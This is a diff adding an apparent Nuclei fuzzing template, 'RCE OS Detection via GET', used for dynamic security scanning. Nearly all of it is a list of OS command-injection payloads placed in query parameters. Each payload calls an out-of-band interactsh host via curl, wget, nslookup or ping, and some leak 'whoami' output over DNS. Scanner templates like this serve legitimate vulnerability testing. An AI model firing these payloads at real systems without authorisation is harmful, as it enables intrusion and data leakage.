@@ -1,0 +1,51 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{rce}}'
+    mode: multiple
+    part: query
+    type: replace
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  method: GET
+  path:
+  - '{{BaseURL}}'
+  payloads:
+    rce:
+    - $(curl {{interactsh-url}})
+    - $(nslookup {{interactsh-url}})
+    - $(ping {{interactsh-url}})
+    - $(wget {{interactsh-url}})
+    - '& nslookup {{interactsh-url}})'
+    - '&& `nslookup {{interactsh-url}}`'
+    - ; $(nslookup {{interactsh-url}})
+    - ;`nslookup {{interactsh-url}}`
+    - ;curl {{interactsh-url}};
+    - ;nslookup {{interactsh-url}}
+    - '`curl {{interactsh-url}}`'
+    - '`nslookup {{interactsh-url}}`'
+    - '`ping {{interactsh-url}}`'
+    - '`wget {{interactsh-url}}`'
+    - http://127.0.0.1/;curl {{interactsh-url}});
+    - nslookup {{interactsh-url}})
+    - '|| $(nslookup {{interactsh-url}})'
+    - '|| `nslookup {{interactsh-url}}`'
+    - '|| nslookup {{interactsh-url}}'
+    - nslookup `whoami`.{{interactsh-url}}
+    - ' nslookup `whoami`.{{interactsh-url}}'
+    - ;nslookup `whoami`.{{interactsh-url}}
+    - '&nslookup `whoami`.{{interactsh-url}}'
+    - '|nslookup `whoami`.{{interactsh-url}}'
+    - '||nslookup `whoami`.{{interactsh-url}}'
+    - '&&nslookup `whoami`.{{interactsh-url}}'
+  stop-at-first-match: true
+id: possible-rce-get
+info:
+  author: reewardius
+  name: RCE OS Detection via GET
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req,dast
